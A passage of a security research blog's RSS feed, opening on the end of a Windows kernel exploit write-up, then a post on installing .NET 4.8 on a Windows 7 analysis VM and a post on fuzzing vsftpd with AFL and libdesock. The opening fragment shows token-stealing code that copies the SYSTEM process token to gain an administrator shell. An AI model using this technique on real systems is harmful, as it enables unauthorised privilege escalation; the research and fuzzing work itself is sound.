maybe_token :&lt;span style="color:#f92672">=&lt;/span> read_u64(process &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> maybe_token &lt;span style="color:#f92672">==&lt;/span> token:
token_offset &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;span style="color:#75715e">// figure out the `_TOKEN` of `nt!PsInitialSystemProcess`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>PsInitialSystemProcess &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess_export);
PsInitialSystemProcessToken &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess &lt;span style="color:#f92672">+&lt;/span> token_offset);
&lt;span style="color:#75715e">// actually steal the access `_TOKEN` to give us complete access rights.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>write_u64(token &lt;span style="color:#f92672">+&lt;/span> token_offset, PsInitialSystemProcessToken);
&lt;span style="color:#75715e">// spawn a shell to keep the access rights in a clean way.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>spawn_shell();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://lolcads.github.io/2022/06/success.png" alt="Success - An Administrator Shell">&lt;/p></content></item><item><title>Installing new .NET versions on a Windows 7 VM</title><link>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</link><pubDate>Wed, 16 Mar 2022 12:01:43 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</guid><description>Installing new .NET versions on a Windows 7 VM In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.
Motivation Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables. Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version. If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed.</description><content>&lt;h1 id="installing-new-net-versions-on-a-windows-7-vm">Installing new .NET versions on a Windows 7 VM&lt;/h1>
&lt;p>In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.&lt;/p>
&lt;h2 id="motivation">Motivation&lt;/h2>
&lt;p>Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables.
Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version.
If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed.
For this reason it might be required to install a recent .NET version on a Windows 7 VM.&lt;/p>
&lt;h2 id="problem">Problem&lt;/h2>
&lt;p>The .NET Framework 4.8 installer tries to verify the integritiy of the installation data prior to the installation.
However, the root certificates required for this verification process are not present on Windows 7.
&lt;img src="https://lolcads.github.io/2022/03/net_0.png" alt="Problem: the installation process fails">
This issue cannot be fixed via Windows updates, as they are not available for Windows 7 anymore.&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;p>First, download the &lt;a href="https://go.microsoft.com/fwlink/?linkid=2088631">offline installer for .NET Framework 4.8&lt;/a>&lt;/p>
&lt;p>Execute the file. This will extract the installation data into a temporary subfolder of &lt;code>C:\&lt;/code> with a random name.
&lt;img src="https://lolcads.github.io/2022/03/net_1.png" alt="Extraction of the installation data into a temporary directory">&lt;/p>
&lt;p>Wait until the extraction process has finished and an installer opens. You don&amp;rsquo;t have to interact with this installer window at all. Just leave it opened to prevent the deletion of the temporary subfolder.
&lt;img src="https://lolcads.github.io/2022/03/net_2.png" alt="Installer to be left opened">&lt;/p>
&lt;p>Next, navigate to the temporary folder and execute the file &lt;code>netfx_Full_x64.msi&lt;/code> or &lt;code>netfx_Full_x86.msi&lt;/code>.
This will trigger the installation of .NET Framework 4.8. Restart the system after the installation finished.
&lt;img src="https://lolcads.github.io/2022/03/net_3.png" alt="Locating netfx_Full">&lt;/p>
&lt;p>That&amp;rsquo;s it, you&amp;rsquo;re all set! :)&lt;/p></content></item><item><title>libdesock</title><link>https://lolcads.github.io/posts/2022/02/libdesock/</link><pubDate>Tue, 22 Feb 2022 14:24:40 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/02/libdesock/</guid><description>Fuzzing Network Applications with AFL and libdesock Fuzzing network servers with AFL is challenging since AFL provides its input via stdin or command line arguments while servers get their input over network connections. As the popularity of AFL grew, many attempts have been made of fuzzing popular servers like apache and nginx using different techniques and hacky workarounds. However an off-the-shelf network fuzzing solution for AFL didn&amp;rsquo;t exist for a long time until so-called &amp;ldquo;desocketing&amp;rdquo; tools emerged.</description><content>&lt;h1 id="fuzzing-network-applications-with-afl-and-libdesock">Fuzzing Network Applications with AFL and libdesock&lt;/h1>
&lt;p>Fuzzing network servers with AFL is challenging since AFL provides its
input via stdin or command line arguments while servers get their input
over network connections.
As the popularity of AFL grew, many attempts have been made of fuzzing
popular servers like apache and nginx using different
techniques and hacky workarounds. However an off-the-shelf network fuzzing
solution for AFL didn&amp;rsquo;t exist for a long time until so-called &amp;ldquo;desocketing&amp;rdquo;
tools emerged.
These desocketing tools enabled network fuzzing without
making a lot of additional modifications to the program under test
and quickly became widely used in combination with AFL.&lt;/p>
&lt;h2 id="what-is-desocketing">What is &amp;ldquo;desocketing&amp;rdquo;?&lt;/h2>
&lt;p>Before desocketing tools were published two common techniques for
network fuzzing were&lt;/p>
&lt;ol>
&lt;li>Sending fuzz input over real network connections&lt;/li>
&lt;li>Modifying the target source to use stdin instead of sockets&lt;/li>
&lt;/ol>
&lt;p>The first approach is the most prevalent used by popular fuzzers
like &lt;a href="https://github.com/jtpereyda/boofuzz">boofuzz&lt;/a> or in academia by &lt;a href="https://github.com/aflnet/aflnet">AFLnet&lt;/a> or &lt;a href="https://github.com/stateafl/stateafl">StateAFL&lt;/a>.
This however suffers performance- and stability-drawbacks.
Stability is affected because the servers run with all threads and child processes
enabled. Background threads can be scheduled independently from the input being sent
resulting in invalid coverage information.
Performance is affected because of the amount of kernel activity and network overhead involved.&lt;/p>
&lt;p>The second approach solves the network overhead problem but does not reduce the
kernel activity. It also takes a considerable amount of effort that may lead
to changing &lt;a href="https://securitylab.github.com/research/fuzzing-sockets-FTP/">thousands of lines of code&lt;/a>.&lt;/p>
&lt;p>Desocketing aims to reduce kernel activity and the amount of modifications necessary to a program.
It works by building a shared library that implements functions
like &lt;code>socket()&lt;/code> and &lt;code>accept()&lt;/code> and preloading it via &lt;code>LD_PRELOAD&lt;/code>
into the address space of a network application where it replaces
the network stack of the libc.
The desocketing library simulates incoming connections to the server
but every read on a socket is replaced by a read on stdin
and every write on a socket is redirected to stdout.
Strictly speaking the latter isn&amp;rsquo;t necessary for fuzzing but it&amp;rsquo;s useful
for debugging.&lt;/p>
&lt;p>The following figure demonstrates how to desock nginx such that the network
traffic becomes visible on a terminal.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/02/demo.svg" alt="">&lt;/p>
&lt;h2 id="how-desocketing-works">How desocketing works&lt;/h2>
&lt;p>Making desocketing libraries has its complexities.
AFLplusplus' &lt;a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable/utils/socket_fuzzing">socketfuzz&lt;/a>
ships a desocketing library that just returns &lt;code>0&lt;/code> (stdin) in &lt;code>accept()&lt;/code>.
Unfortunately this doesn&amp;rsquo;t quite work because &lt;code>send()&lt;/code> and &lt;code>recv()&lt;/code> need an
fd that actually refers to a network connection. If you pass them an fd that
refers to a file the kernel will complain.
Thus we need more complicated methods.&lt;/p>
&lt;p>At the time of writing this, there exists only one popular desocketing solution: &lt;a href="https://github.com/zardus/preeny">preeny&lt;/a>.
preeny creates a socketpair &lt;code>(a,b)&lt;/code> and spawns two threads &lt;code>t1&lt;/code> and
&lt;code>t2&lt;/code> in every call to &lt;code>socket()&lt;/code>.&lt;/p>
&lt;ul>
&lt;li>Thread &lt;code>t1&lt;/code> forwards all data from stdin to &lt;code>a&lt;/code>&lt;/li>
&lt;li>Thread &lt;code>t2&lt;/code> forwards all data from &lt;code>a&lt;/code> to stdout&lt;/li>
&lt;li>In &lt;code>socket()&lt;/code> preeny returns &lt;code>b&lt;/code>&lt;/li>
&lt;li>When AFL writes input to stdin, thread &lt;code>t1&lt;/code> forwards that data to &lt;code>a&lt;/code>&lt;/li>
&lt;li>Writing to &lt;code>a&lt;/code> means that the data will become available in &lt;code>b&lt;/code> and the
application can read the request from &lt;code>b&lt;/code>&lt;/li>
&lt;li>The application writes a response back to &lt;code>b&lt;/code>, making the data available
in socket &lt;code>a&lt;/code> where &lt;code>t2&lt;/code> forwards it to stdout.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://lolcads.github.io/2022/02/preeny.png" alt="">&lt;/p>
&lt;p>Unfortunately this design makes preeny unsuitable for fuzzing:&lt;/p>
&lt;ol>
&lt;li>Spawning threads and joining them introduces additional overhead.&lt;/li>
&lt;li>Each thread realizes busy waiting by calling &lt;code>poll()&lt;/code> every 15ms&lt;/li>
&lt;li>Preeny still relies on a lot of kernel interaction. I/O multiplexing (select, poll, epoll)
is left completely to the kernel.&lt;/li>
&lt;li>The threads may introduce additional instability.&lt;br>
Normally you want to disable threads when fuzzing with AFL.&lt;/li>
&lt;li>It can handle only single-threaded applications but most of the servers
are multi-threaded&lt;/li>
&lt;/ol>
&lt;p>A better desocketing library is needed that is more resource-efficient and handles the complexities of
modern network applications correctly.
So we created a new desocketing library: &amp;ldquo;libdesock&amp;rdquo;.&lt;/p>
&lt;h2 id="using-libdesock">Using libdesock&lt;/h2>
&lt;p>libdesock fully emulates the network stack of the kernel. The kernel is only queried to obtain file
descriptors and to do I/O on stdin and stdout.
Everything else - handling of connections, I/O multiplexing (select, poll, epoll), handling socket metadata (getsockname, getpeername) - entierly happens in userland.&lt;br>
In contrast to preeny, libdesock supports multi-threaded applications and its overall design
makes it more resource efficient and 5x faster than preeny.
This has no effect on AFL&amp;rsquo;s exec/s though, since that primarily depends on the program
and the input.&lt;/p>
&lt;p>We have tested libdesock on common network daemons like&lt;/p>
&lt;ul>
&lt;li>nginx&lt;/li>
&lt;li>Apache httpd&lt;/li>
&lt;li>OpenSSH&lt;/li>
&lt;li>Exim&lt;/li>
&lt;li>bind9&lt;/li>
&lt;li>OpenVPN&lt;/li>
&lt;li>Redis&lt;/li>
&lt;li>dnsmasq&lt;/li>
&lt;li>cupsd&lt;/li>
&lt;li>curl (clients are supported too)&lt;/li>
&lt;/ul>
&lt;p>and several smaller applications.&lt;br>
libdesock also supports event libraries like&lt;/p>
&lt;ul>
&lt;li>libevent&lt;/li>
&lt;li>libuv&lt;/li>
&lt;li>libapr-2&lt;/li>
&lt;/ul>
&lt;p>Network applications generally are very complex and require modifications to be fuzzable with AFL.&lt;br>
They use multiple processes and threads, encryption, compression, checksums, hashes
and sometimes custom allocators that don&amp;rsquo;t work with ASAN.
They also run in an endless loop and have a lot of disk I/O (pidfiles, logfiles, temporary files).
Setting these targets up for fuzzing means to reduce the complexity of the applications.
The following example demonstrates the modifications necessary to fuzz &lt;a href="https://security.appspot.com/vsftpd.html">vsftpd&lt;/a>, a popular FTP server on Linux.&lt;/p>
&lt;h2 id="fuzzing-vsftpd">Fuzzing vsftpd&lt;/h2>
&lt;h3 id="getting-the-source">Getting the source&lt;/h3>
&lt;p>Download version 3.0.5 of vsftpd:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://security.appspot.com/downloads/vsftpd-3.0.5.tar.gz
tar -xf vsftpd-3.0.5.tar.gz
cd vsftpd-3.0.5
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="patching-the-source">Patching the source&lt;/h3>
&lt;p>vsftpd creates a new child process for each connection. We prohibit that
by commenting out the code that does the fork in &lt;code>standalone.c&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -153,6 +153,7 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> child_info.num_this_ip = 0;
p_raw_addr = vsf_sysutil_sockaddr_get_raw_addr(p_accept_addr);
child_info.num_this_ip = handle_ip_count(p_raw_addr);
&lt;span style="color:#a6e22e">+ /*
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (tunable_isolate)
{
if (tunable_http_enable &amp;amp;&amp;amp; tunable_isolate_network)
&lt;span style="color:#75715e">@@ -168,6 +169,8 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
new_child = vsf_sysutil_fork_failok();
}
&lt;span style="color:#a6e22e">+ */
&lt;/span>&lt;span style="color:#a6e22e">+ new_child = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (new_child != 0)
{
/* Parent context */
&lt;/code>&lt;/pre>&lt;/div>&lt;p>vsftpd duplicates the FTP command socket to stdin, stdout and stderr.
This obviously interfers with AFL so we disable that in &lt;code>defs.h&lt;/code> &amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -3,7 +3,7 @@
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
#define VSFTP_DEFAULT_CONFIG &amp;#34;/etc/vsftpd.conf&amp;#34;
&lt;span style="color:#f92672">-#define VSFTP_COMMAND_FD 0
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+#define VSFTP_COMMAND_FD 29
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>
#define VSFTP_PASSWORD_MAX 128
#define VSFTP_USERNAME_MAX 128
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip; and in &lt;code>standalone.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -205,9 +205,7 @@ static void
&lt;/span>&lt;span style="color:#75715e">&lt;/span> prepare_child(int new_client_sock)
{
/* We must satisfy the contract: command socket on fd 0, 1, 2 */
&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 0);
&lt;/span>&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 1);
&lt;/span>&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 2);
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ vsf_sysutil_dupfd2(new_client_sock, VSFTP_COMMAND_FD);
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (new_client_sock &amp;gt; 2)
{
vsf_sysutil_close(new_client_sock);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next, vsftpd enforces a custom memory limit that interfers with ASAN.
We disable the memory limit in &lt;code>sysutil.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -2793,6 +2793,7 @@ void
&lt;/span>&lt;span style="color:#75715e">&lt;/span> vsf_sysutil_set_address_space_limit(unsigned long bytes)
{
/* Unfortunately, OpenBSD is missing RLIMIT_AS. */
&lt;span style="color:#a6e22e">+ return;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> #ifdef RLIMIT_AS
int ret;
struct rlimit rlim;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we add a forkserver to vsftpd in &lt;code>prelogin.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -59,6 +59,7 @@ init_connection(struct vsf_session* p_sess)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
emit_greeting(p_sess);
}
&lt;span style="color:#a6e22e">+ __AFL_INIT();
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> parse_username_password(p_sess);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>vsftpd registers a &lt;code>SIGCHLD&lt;/code> handler that interfers with the forkserver
so we have to disable that too in &lt;code>standalone.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -74,7 +74,7 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
vsf_sysutil_setproctitle(&amp;#34;LISTENER&amp;#34;);
}
&lt;span style="color:#f92672">- vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1);
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ //vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1);
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> vsf_sysutil_install_sighandler(kVSFSysUtilSigHUP, handle_sighup, 0, 1);
if (tunable_listen)
{
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Last but not least we disable the &lt;code>bug()&lt;/code> function in &lt;code>utility.c&lt;/code>. This function does a failing &lt;code>fcntl()&lt;/code>
on an fd returned by the desocketing library since the fd is not a real socket. vsftpd handles the &lt;code>fcntl()&lt;/code> failure by calling &lt;code>bug()&lt;/code> again
leading to an infinite loop.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -40,6 +40,7 @@ die2(const char* p_text1, const char* p_text2)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> void
bug(const char* p_text)
{
&lt;span style="color:#a6e22e">+ return;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> /* Rats. Try and write the reason to the network for diagnostics */
vsf_sysutil_activate_noblock(VSFTP_COMMAND_FD);
(void) vsf_sysutil_write_loop(VSFTP_COMMAND_FD, &amp;#34;500 OOPS: &amp;#34;, 10);
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="build-configuration">Build configuration&lt;/h3>
&lt;p>In the &lt;code>Makefile&lt;/code> replace:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -1,16 +1,16 @@
&lt;/span>&lt;span style="color:#75715e">&lt;/span> # Makefile for systems with GNU tools
&lt;span style="color:#f92672">-CC = gcc
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+CC = afl-clang-fast
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> INSTALL = install
IFLAGS = -idirafter dummyinc
#CFLAGS = -g
&lt;span style="color:#f92672">-CFLAGS = -O2 -fPIE -fstack-protector --param=ssp-buffer-size=4 \
&lt;/span>&lt;span style="color:#f92672">- -Wall -W -Wshadow -Werror -Wformat-security \
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+CFLAGS = -fsanitize=address -g -Og -fPIE -fstack-protector \
&lt;/span>&lt;span style="color:#a6e22e">+ -Wall -W -Wshadow -Wformat-security \
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> -D_FORTIFY_SOURCE=2 \
#-pedantic -Wconversion
LIBS = `./vsf_findlibs.sh`
&lt;span style="color:#f92672">-LINK = -Wl,-s
&lt;/span>&lt;span style="color:#f92672">-LDFLAGS = -fPIE -pie -Wl,-z,relro -Wl,-z,now
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+LINK =
&lt;/span>&lt;span style="color:#a6e22e">+LDFLAGS = -fPIE -pie -Wl,-z,relro -Wl,-z,now -fsanitize=address
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>
OBJS = main.o utility.o prelogin.o ftpcmdio.o postlogin.o privsock.o \
tunables.o ftpdataio.o secbuf.o ls.o \
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="runtime-configuration">Runtime configuration&lt;/h3>
&lt;p>Like most other servers, vsftpd needs a config file. Create
&lt;code>fuzz.conf&lt;/code> with the following contents:&lt;/p>
&lt;pre tabindex="0">&lt;code>listen=YES
seccomp_sandbox=NO
one_process_model=YES
# User management
anonymous_enable=YES
no_anon_password=YES
nopriv_user=nobody
# Permissions
connect_from_port_20=NO
run_as_launching_user=YES
listen_port=2121
listen_address=127.0.0.1
pasv_address=127.0.0.1
# Filesystem interactions
write_enable=NO
download_enable=NO
&lt;/code>&lt;/pre>&lt;h3 id="start-fuzzing">Start fuzzing&lt;/h3>
&lt;p>To use the desocketing library with AFL we need to set the &lt;code>AFL_PRELOAD&lt;/code>
variable.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">export AFL_PRELOAD&lt;span style="color:#f92672">=&lt;/span>libdesock.so
afl-fuzz -i corpus -o findings -m none -- ./vsftpd fuzz.conf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://lolcads.github.io/2022/02/afl.svg" alt="">&lt;/p>
&lt;p>Now it&amp;rsquo;s only a matter of high-quality custom mutators and time to find some bugs.&lt;/p>
&lt;p>libdesock can be downloaded here: &lt;a href="https://github.com/fkie-cad/libdesock">https://github.com/fkie-cad/libdesock&lt;/a>&lt;/p></content></item></channel></rss>